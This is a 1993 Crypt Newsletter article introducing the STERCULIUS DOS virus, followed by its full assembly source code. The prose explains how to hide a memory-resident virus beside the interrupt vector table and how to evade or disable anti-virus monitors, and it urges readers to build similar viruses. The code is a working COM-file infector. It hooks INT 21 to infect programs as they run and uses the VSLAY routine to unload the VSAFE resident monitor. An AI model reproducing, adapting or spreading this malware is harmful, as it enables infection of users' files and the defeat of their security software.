comment $

STERCULIUS virus: copying a virus into the air in the interrupt
vector table - for CRYPT NEWSLETTER 18.

The STERCULIUS virus uses the 'hole' in DOS's memory that is
found after the interrupt vector table located at 0000:0000 in memory.
This hole in memory is unused much of the time and is filled with
'00''s, or "air", starting at 0000:01E0.

Using the MS-DOS program DEBUG we can take a quick look at this
empty space by typing the command:
     
     DEBUG
     d 0000:01e0

And we see:

0000:01E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:01F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0200  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0210  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0220  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0240  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
0000:0250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................

Not much of anything! 

The LoveChild virus uses the same space and if it were present
in memory (not likely, as it barely works under DOS 3.3),
you'd see something like "v2 LoveChild in reward for software
sealing [sic]" or some similar gibber in the above display.

Sterculius copies itself to segment:offset 0000:01E0 in memory, 
right next to the end of the data in the interrupt vector table,
like LoveChild and if we fire up DEBUG again once the virus
is in memory:

0000:01E0  E8 0A 00 53 54 45 52 43-55 4C 49 55 53 5E 83 EE   ...STERCULIUS^..
0000:01F0  03 56 FC 83 C6 55 90 BF-00 01 A5 A5 5E 33 C0 8E   .V...U......^3..
0000:0200  C0 BF E0 01 26 81 7D 03-53 54 74 1E B9 08 01 90   ....&.}.STt.....
0000:0210  F3 A4 BE 84 00 8E D8 A5-A5 BF E0 01 83 C7 63 90   ..............c.
0000:0220  FA 89 7C FC 89 44 FE FB-0E 1F 0E 07 BE 00 01 56   ..|..D.........V
0000:0230  C3 E9 00 00 53 4D 5A 63-01 9C 2E FF 1E E8 02 C3   ....SMZc........
0000:0240  E9 A4 00 80 FC 4B 75 F8-50 53 51 52 1E 06 56 57   .....Ku.PSQR..VW
0000:0250  55 9C B8 00 43 E8 E1 FF-51 1E 52 33 C9 B8 01 43   U...C...Q.R3...C

Four!

Without the marker, "STERCULIUS," the virus would be difficult 
for the user to see in memory for a couple of reasons: 

1) Very few people actually know what system memory in the interrupt 
   table looks like normally,

2) It is not a place any of the current memory spies tell you to look for 
   viruses.  

IF you scan up the rest of the table you will see the remainder of the 
virus and about once again as much free space left.  
That means you can fit about a 300+ byte virus into this space, plenty 
of room for lots of extra code.

If you look again at the DEBUG dump you will see "MZ" - 
that is DEBUG's EXEfile identifier - the first word Sterculius pulls off of 
any executed program to check if it's a suitable candidate for infection.  

Sterculius stores the word and in the case of DEBUG, lets the program pass by.
If a .COMfile had just been loaded, the original program's jump would 
be occupying that space.

Clear?  
Now you can follow this example to make memory resident viruses that occupy
that 'hole' in memory next to the  interrupt vector table.

Viruses using this method of residence aren't detected by 
98% of the anti-virus guards - or virus filters - specifically designed 
to detect programs which go resident. This is odd, since the technique 
isn't particularly new.  However, one or two anti-virus manufacturers
have taken steps in this direction, coding their memory filters so
that some of their code occupies the same general area that a virus
like STERCULIUS might use.  Then again, these developers have to
deal with users who may have memory management drivers which muck
about in the same space.  You see, there are always trade-offs
in this kind of work.

Try STERCULIUS with Central Point, Microsoft Anti-virus, something dumb 
like INVIRCBLE, or just about any TYPICAL resident monitor.  
STERCULIUS also contains the "casual" anti-anti-virus measure, VSLAY,
which will under optimum conditions, deinstall the Microsoft Anti-virus
resident filter.

Interesting!  

Many lazy people have grown fond of McAfee Associates PROVIEW, too.  
It's good for checking up on viruses in memory because it puts a 
big <UNKNOWN> message on the screen when a virus is taking up space at 
the top of conventional RAM.  

You won't see STERCULIUS using this technique, nor will a look at where 
INT 21 is pointing under PROVIEW tell the dilettante much.  

Proview will show you the interrupt is still pointing into the table, where 
it belongs.  
You'll have to look close to see that the original address has changed!

STERCULIUS has been tested under QEMM 7.0 and QEMM 6.0 but there is
always the probability that it will crash on other multi-tasking systems 
which use other memory managers. 


Often, you see, they use the space where STERCULIUS resides.  

If this is the case, they system will hang when STERCULIUS invades it.  
You can alter this behavior by looking at the interrupt vector table on your 
system and altering where STERCULIUS copies itself into memory by moving 
the virus up in RAM.

Also, this method of residency has an indirect benefit.  
STERCULIUS can't be properly DEBUGGED by ZD86 because they conflict
over the same memory space.

STERCULIUS infects COMMAND.COM quite easily and doesn't interfere
with boot up.  However, since COMMAND.COM overwrites the space
STERCULIUS is using at boot time, the virus is expunged from memory
on completion of system installation.  Shelling anytime thereafter
reinstalls the virus. Reloading the transient portion of COMMAND.COM
doesn't interfere with the virus either.
 

$

;**************************************
;            STERCULIUS VIRUS
;
; AUTHORS: K”hntark / Urnst Kouch
; DATE:    SEPTEMBER 1993
;
;**************************************

.model tiny
.code
		org 100h

START:                                                 
		db      0E9h,03,00,'S'   ;Jump to Virus_Entry

FAKE_HOST:                                
		int     20h              ;host file terminate


VIRUS_ENTRY:

		call    INITIALIZE

ID:             db      'STERCULIUS'      ;The Roman god of feces
					  ;intellectual property of Mike
INITIALIZE:                               ;Judge, sort of, and if this
		pop     si                ;means nothing to you, then you're
		sub     si,3              ;not paying attention

;*****************                
; Restore host
;*****************
		
		push    si
		cld
		add     si,OFFSET HOST_STUB - OFFSET VIRUS_ENTRY
		mov     di,0100h
		movsw
		movsw
		pop     si

;***************************                
; Remove MSAV / CPAV VSAFE    ;<---VSLAY, Crypt Newsletter 15 [ref]
;***************************
	    
	    mov  dx,5945h
	    mov  ax,0FA01h    ;AL=01 very important!
	    int  21h

;***************************                
; Check if already resident
;***************************

		xor     ax,ax
		mov     es,ax  
		mov     di,01E0h
		cmp     WORD PTR es:[di + 3],'TS'
		je      EXIT
		
		mov     cx,ZIZE
		rep     movsb           ;move virus to 0000:01E0 from ds:si
		
;***********************                
; Mov INT 21 address
;***********************

		mov     si,21h * 4
		mov     ds,ax        ;ds=0
		movsw                ;from ds:si to es:di
		movsw 
		
;***********************                
;  Hook INT 21
;***********************

		mov     di,01E0h
		add     di,OFFSET INT_21_HANDLER - OFFSET VIRUS_ENTRY
		cli                           ;disable interrupts
		mov     WORD PTR [si - 4],di  ;address of INT 21 handler
		mov     WORD PTR [si - 2],ax  
		sti                           ;enable interrupts  

		push    cs
		pop     ds
EXIT:           push    cs
		pop     es         
		mov     si,0100h
		push    si
	       ;push    0100h       ;386 code left out
		ret                 ;return to host

;----------------------------------------------------------------------------

NEW_HOST_ENTRY:
		db      0E9h,00,00,'S'

HOST_STUB:
		db  090h,090h,090h,090h ;nops

INT_21:
		pushf  
		call  DWORD PTR cs:[REALL_INT_21]
		ret
		 
QUICK_EXIT:     jmp     QUICK_OUT

;----------------------------------------------------------------------------
INT_21_HANDLER:

		 cmp     ah,4Bh           ;execute a file?
		 jne     QUICK_EXIT       ;quick exit handler
		 
		 push ax
		 push bx
		 push cx
		 push dx
		 push ds
		 push es
		 push si
		 push di
		 push bp
		 pushf

;***********************                
;  Save Attributes
;***********************

		 mov     ax,4300h
		 call    INT_21
		 jc      SKIP
		 push    cx         ;save attributes to stack
		 push    ds
		 push    dx         ;ds:dx = pathname to file


;***********************                
;  Klear Attributes
;***********************

		 xor     cx,cx
		 mov     ax,4301h
		 call    INT_21
SKIP:            jc      RESTORE_ATTRIBUTES

;***********************                
;  Open File
;***********************

		 mov     ax,3D02h
		 call    INT_21
		 jc      RESTORE_ATTRIBUTES
		 xchg    bx,ax         ;file handle to bx

;***********************                
;  Save Date & time
;***********************
		 
		 mov   ax,5700h
		 call  INT_21
		 push  dx              ;save date
		 push  cx              ;save time

;***********************                
;  Read 4 bytes
;***********************

		mov     cx,04                ;# of bytes to read
		mov     dx,HOST_STUBB        ;buffer to read 4 bytes to
		mov     si,dx
		mov     ah,3Fh
		push    cs 
		pop     ds                   ;ds=cs
		call    INT_21               ;read to ds:dx
		jc      CLOSE_FILE

;***********************                
;  Check File
;***********************

		cmp     WORD PTR [si],'ZM'     ;EXE file?
		je      CLOSE_FILE
		cmp     BYTE PTR [si + 3],'S'  ;infected COM file?
		je      CLOSE_FILE
		
;***********************                
;  File PTR @EOF
;***********************
		
		mov     ax,4202h
		xor     cx,cx
		cwd               ;cx = dx = 00
		call    INT_21

		sub     ax,03     ;fix file size 
		xchg    bp,ax     ;address to jump to
		
		add     ax,ZIZE       ;file + VIRUS SIZE > 64K?
		jc      CLOSE_FILE    ;exit if so

;***********************                
;  Write Virus
;***********************

	       mov     ah,40h
	       mov     cx,ZIZE    ;cx = #of bytes
	       mov     dx,01E0h   ;dx = write from here
	       call    INT_21

;***********************                
;  Set PTR @BOF
;***********************
		
	       mov     ax,4200h  
	       xor     cx,cx
	       cwd               ;cx = dx = 00
	       call    INT_21

;***********************                
;  Write new jump
;***********************

	       mov     ah,40h
	       mov     cx,4                      ; # of bytes to write
	       mov     dx,NEW_HOST_ENTRYY        ;dx = write from here
	       mov     si,dx

	       mov     WORD PTR [si + 1],bp      ;insert new address
	       call    INT_21

CLOSE_FILE:                
		
;***********************                
;  Restore Date & time
;***********************
		 
	       pop   cx       ;restore time
	       pop   dx       ;restore date
	       mov   ax,5701h
	       call  INT_21

;***********************                
;  Klose File
;***********************
	       
	       mov     ah,3Eh 
	       call    INT_21
		 
;***********************                
;  Restore Attributes
;***********************

RESTORE_ATTRIBUTES:
	       
	       mov     ax,4301h
	       pop     dx         ;ds:dx = pathname to file
	       pop     ds         ;restore pathname
	       pop     cx         ;restore old attributes
	       call    INT_21

;***********************                
;  Restore registers
;***********************

EXIT_HANDLER:                   
		 popf
		 pop  bp
		 pop  di
		 pop  si
		 pop  es
		 pop  ds
		 pop  dx
		 pop  cx
		 pop  bx
		 pop  ax
		
QUICK_OUT:       db   0EAh       ; jmp OFFSET:SEGMENT
END_VIRUS:                
REAL_INT_21:


ZIZE             equ     OFFSET END_VIRUS              - VIRUS_ENTRY 
REALL_INT_21     equ     01E0h + OFFSET REAL_INT_21    - OFFSET VIRUS_ENTRY
HOST_STUBB       equ     01E0h + OFFSET HOST_STUB      - OFFSET VIRUS_ENTRY     
NEW_HOST_ENTRYY  equ     01E0h + OFFSET NEW_HOST_ENTRY - OFFSET VIRUS_ENTRY

END             START
		

